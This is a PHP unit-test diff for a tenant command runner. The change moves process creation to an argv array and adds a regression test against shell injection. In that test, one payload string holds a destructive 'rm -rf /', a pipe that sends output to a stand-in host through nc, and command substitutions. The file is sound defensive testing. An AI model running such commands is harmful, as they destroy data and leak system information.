@@ -39,8 +39,8 @@ final class TenantRunCommandTest extends TestCase
         $processMock->method('run')->willReturn(0);
         $processMock->method('getExitCode')->willReturn(0);
 
-        $processFactory = function (string $commandLine) use ($processMock, &$capturedCommand): Process {
-            $capturedCommand = $commandLine;
+        $processFactory = function (array $command) use ($processMock, &$capturedCommand): Process {
+            $capturedCommand = $command;
 
             return $processMock;
         };
@@ -50,10 +50,10 @@ final class TenantRunCommandTest extends TestCase
         $tester->execute(['tenant' => 'acme', 'command_string' => 'app:some-command']);
 
         $this->assertNotNull($capturedCommand);
-        // escapeshellarg wraps values in quotes on POSIX systems: --tenant='acme' or --tenant="acme"
-        $this->assertMatchesRegularExpression('/--tenant=[\'"]?acme[\'"]?/', $capturedCommand);
-        $this->assertStringContainsString('app:some-command', $capturedCommand);
-        $this->assertStringContainsString('/app/bin/console', $capturedCommand);
+        // argv is a literal list — no shell escaping needed
+        $this->assertContains('--tenant=acme', $capturedCommand);
+        $this->assertContains('app:some-command', $capturedCommand);
+        $this->assertContains('/app/bin/console', $capturedCommand);
     }
 
     public function testChildExitCodePropagated(): void
@@ -68,7 +68,7 @@ final class TenantRunCommandTest extends TestCase
         $processMock->method('run')->willReturn(42);
         $processMock->method('getExitCode')->willReturn(42);
 
-        $processFactory = fn (string $commandLine): Process => $processMock;
+        $processFactory = fn (array $command): Process => $processMock;
 
         $command = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
         $tester = new CommandTester($command);
@@ -95,7 +95,7 @@ final class TenantRunCommandTest extends TestCase
             });
         $processMock->method('getExitCode')->willReturn(0);
 
-        $processFactory = fn (string $commandLine): Process => $processMock;
+        $processFactory = fn (array $command): Process => $processMock;
 
         $command = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
         $tester = new CommandTester($command);
@@ -110,12 +110,61 @@ final class TenantRunCommandTest extends TestCase
             ->method('findBySlug')
             ->willThrowException(new TenantNotFoundException('Tenant "unknown" not found.'));
 
-        $processFactory = fn (string $commandLine): Process => $this->createMock(Process::class);
+        $processFactory = fn (array $command): Process => $this->createMock(Process::class);
 
         $command = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
         $tester = new CommandTester($command);
 
         $this->expectException(TenantNotFoundException::class);
         $tester->execute(['tenant' => 'unknown', 'command_string' => 'app:some-command']);
+    }
+
+    /**
+     * WR-04 regression — shell metacharacters in the command_string MUST
+     * arrive at Process as literal argv tokens, NOT be interpreted by a
+     * shell. Previously, $commandString was interpolated into a
+     * `Process::fromShellCommandline` line and an attacker controlling
+     * command_string could inject arbitrary shell.
+     */
+    public function testShellMetacharactersAreInertInCommandString(): void
+    {
+        $tenant = $this->createMock(TenantInterface::class);
+        $this->tenantProvider->method('findBySlug')->willReturn($tenant);
+
+        $captured = null;
+        /** @var Process&MockObject $processMock */
+        $processMock = $this->createMock(Process::class);
+        $processMock->method('run')->willReturn(0);
+        $processMock->method('getExitCode')->willReturn(0);
+
+        $processFactory = function (array $command) use ($processMock, &$captured): Process {
+            $captured = $command;
+
+            return $processMock;
+        };
+
+        $cmd = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
+        $tester = new CommandTester($cmd);
+
+        // An attacker-controlled command_string with classic injection payloads.
+        // Each shell metacharacter MUST land as part of a literal argv token,
+        // never interpreted. The Process array form guarantees this because
+        // argv elements pass straight to execve().
+        $payload = 'app:harmless; rm -rf / # && whoami | nc evil.example 1337 $(date) `id` > /tmp/pwn';
+        $tester->execute(['tenant' => 'acme', 'command_string' => $payload]);
+
+        self::assertIsArray($captured);
+        // The whole payload, split only on whitespace, is preserved as tokens
+        // with shell metacharacters embedded as plain characters in each token.
+        self::assertContains('app:harmless;', $captured);
+        self::assertContains('rm', $captured);
+        self::assertContains('/', $captured);
+        self::assertContains('&&', $captured);
+        self::assertContains('|', $captured);
+        self::assertContains('$(date)', $captured);
+        self::assertContains('`id`', $captured);
+        self::assertContains('>', $captured);
+        // And the tenant flag still lands correctly, untouched by the payload.
+        self::assertContains('--tenant=acme', $captured);
     }
 }
